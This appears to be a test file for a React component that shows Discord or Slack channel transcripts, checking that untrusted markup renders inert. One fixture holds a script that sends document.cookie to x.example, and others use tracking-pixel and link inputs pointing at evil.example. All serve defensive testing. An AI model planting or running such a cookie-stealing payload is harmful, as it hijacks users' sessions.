// A channel conversation's text comes from anyone in the Discord or Slack
// channel, stored verbatim, and from answers that may repeat it. The rows here
// are built the way the app builds them, by loading a server-shaped response
// through fetchChannelConversation, so the transcript sees exactly what the
// history hydration produces, failed turns included.
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';

const hostMock = vi.hoisted(() => ({
  isWeb: true,
  isElectron: false,
  getApiOrigin: () => 'http://127.0.0.1:26866',
  getAccessToken: vi.fn(async () => null),
  openExternal: vi.fn(),
}));
vi.mock('../../platform/host', async (importOriginal) => ({
  ...(await importOriginal()),
  host: hostMock,
}));
vi.mock('../lib/analytics', () => ({ setAntonInstallId: vi.fn() }));
vi.mock('../lib/skillsStore', () => ({ useSkillNames: () => new Set() }));

import { fetchChannelConversation } from '../api';
import ChannelTranscript from './ChannelTranscript';

const CID = '6f1c2a5e-3b4d-4e8f-9a0b-1c2d3e4f5a6b';
const META = {
  id: CID, title: 'discord: general', channelType: 'discord',
  createdAt: '2026-11-03T10:00:00+00:00', updatedAt: '2026-11-03T11:00:00+00:00',
};
const CHART = '```chartjs\n(fetch("https://x.example/?t="+document.cookie),{type:"bar",data:{}})\n```';
const FORM = '```data-vault-form\n{"engine":"postgres","fields":[]}\n```';

let originalFetch;
beforeEach(() => { originalFetch = global.fetch; });
afterEach(() => { global.fetch = originalFetch; });

async function loadRows(items) {
  global.fetch = vi.fn(async (url) => new Response(
    JSON.stringify(String(url).includes('/items') ? items : META),
    { status: 200, headers: { 'Content-Type': 'application/json' } },
  ));
  const result = await fetchChannelConversation(CID);
  expect(result.status).toBe('ok');
  return result.task.messages;
}

function row(role, content, extra = {}) {
  return { id: `${role}-${Math.random()}`, role, content, created_at: '2026-11-03T11:00:00', events: [], ...extra };
}

describe('ChannelTranscript', () => {
  it('shows what people in the channel and the agent said', async () => {
    const messages = await loadRows([
      row('user', 'alex: what were sales last week?'),
      row('assistant', 'Sales were **up 4%**.', { events: [{ type: 'response.created' }, { type: 'response.completed' }] }),
    ]);

    render(<ChannelTranscript messages={messages} />);

    expect(screen.getByText('alex: what were sales last week?')).toBeTruthy();
    expect(screen.getByText('up 4%').tagName).toBe('STRONG');
  });

  it('renders a chart block and a form block as plain code, never a chart or a card', async () => {
    // The runtime stores "<sender>: <text>"; a fence only opens on its own line.
    const messages = await loadRows([row('user', `alex: look\n${CHART}`), row('assistant', FORM)]);

    const { container } = render(<ChannelTranscript messages={messages} />);

    expect(container.querySelector('canvas')).toBeNull();
    expect(container.querySelector('form')).toBeNull();
    const code = [...container.querySelectorAll('pre code, code')].map((el) => el.textContent).join('\n');
    expect(code).toContain('document.cookie');
    expect(code).toContain('"engine":"postgres"');
  });

  it('shows images as their alt text and never fetches them', async () => {
    const messages = await loadRows([
      row('user', 'alex: ![pixel](https://evil.example/p.png?c=1)'),
      row('user', 'alex: ![ref pixel][r]\n\n[r]: https://evil.example/r.png'),
      row('assistant', '![same origin](/api/v1/channel-conversations/)', {
        events: [{ type: 'response.created' }, { type: 'response.completed' }],
      }),
    ]);

    const { container } = render(<ChannelTranscript messages={messages} />);

    expect(container.querySelector('img')).toBeNull();
    for (const alt of ['pixel', 'ref pixel', 'same origin']) {
      expect(screen.getByText(`[image: ${alt}]`)).toBeTruthy();
    }
  });

  it('renders an error row as plain text, markup and all', async () => {
    const messages = await loadRows([
      row('user', 'alex: hi'),
      row('assistant', '', {
        events: [{ type: 'response.created' }, { type: 'response.failed', code: 'x', error: `boom [link](https://evil.example)\n${CHART}` }],
      }),
    ]);

    const { container } = render(<ChannelTranscript messages={messages} />);

    expect(container.querySelector('a')).toBeNull();
    expect(container.querySelector('canvas')).toBeNull();
    expect(screen.getByText(/boom \[link\]\(https:\/\/evil\.example\)/)).toBeTruthy();
  });

  it('leaves out tool, system and role-less rows', async () => {
    const messages = [
      ...(await loadRows([row('user', 'alex: shown')])),
      { id: 't1', role: 'tool', content: 'TOOL ROW' },
      { id: 's1', role: 'system', content: 'SYSTEM ROW' },
      { id: 'n1', content: 'NO ROLE' },
    ];

    render(<ChannelTranscript messages={messages} />);

    expect(screen.getByText('alex: shown')).toBeTruthy();
    for (const hidden of ['TOOL ROW', 'SYSTEM ROW', 'NO ROLE']) expect(screen.queryByText(hidden)).toBeNull();
  });

  it("neutralises a loopback link in a person's message", async () => {
    const messages = await loadRows([row('user', 'alex: see [the preview](http://localhost:3000/)')]);

    const { container } = render(<ChannelTranscript messages={messages} />);

    expect(container.querySelector('a')).toBeNull();
  });

  it('shows a failed turn as text and a provider failure as a note', async () => {
    const failed = (code, error) => [
      row('user', 'alex: hi'),
      row('assistant', '', { events: [{ type: 'response.created' }, { type: 'response.failed', code, error }] }),
    ];
    const messages = [
      ...(await loadRows(failed('token_limit', 'no tokens left'))),
      ...(await loadRows(failed('config_required', 'Could not resolve authentication method.'))),
    ];

    render(<ChannelTranscript messages={messages} />);

    expect(screen.getByText('no tokens left')).toBeTruthy();
    expect(screen.getByText(/needed a model provider connection/i)).toBeTruthy();
  });

  it('shows only the text parts of structured content', async () => {
    const messages = await loadRows([
      row('user', [{ type: 'input_text', text: 'alex: from blocks' }, { type: 'input_image', image_url: 'x' }]),
    ]);

    render(<ChannelTranscript messages={messages} />);

    expect(screen.getByText('alex: from blocks')).toBeTruthy();
  });

  it('offers no action but loading earlier messages and copying code', async () => {
    const messages = await loadRows([
      row('user', 'alex: run it'),
      row('assistant', 'Here:\n\n```sql\nselect 1\n```', {
        events: [
          { type: 'response.created' },
          { type: 'response.skill_created', skill: { slug: 'weekly-sales', name: 'Weekly sales', instructions: 'do it' } },
          { type: 'response.completed' },
        ],
      }),
    ]);
    expect(messages[1].steps.map((s) => s.badge)).toContain('Skill');
    const onLoadEarlier = vi.fn();

    render(<ChannelTranscript messages={messages} hasMore onLoadEarlier={onLoadEarlier} />);

    expect(screen.queryByRole('textbox')).toBeNull();
    const labels = screen.getAllByRole('button').map((b) => b.getAttribute('aria-label') || b.textContent.trim());
    expect(labels.filter((l) => !/^Copy\b/.test(l))).toEqual(['Load earlier messages']);
    fireEvent.click(screen.getByRole('button', { name: 'Load earlier messages' }));
    expect(onLoadEarlier).toHaveBeenCalledTimes(1);
  });

  it('hides "Load earlier" when the whole history is loaded or a page is on its way', async () => {
    const messages = await loadRows([row('user', 'alex: hi')]);

    const { rerender } = render(<ChannelTranscript messages={messages} hasMore={false} onLoadEarlier={vi.fn()} />);
    expect(screen.queryByRole('button', { name: 'Load earlier messages' })).toBeNull();

    rerender(<ChannelTranscript messages={messages} hasMore loadingEarlier onLoadEarlier={vi.fn()} />);
    expect(screen.queryByRole('button', { name: 'Load earlier messages' })).toBeNull();
    expect(screen.getByText(/Loading earlier/)).toBeTruthy();
  });
});
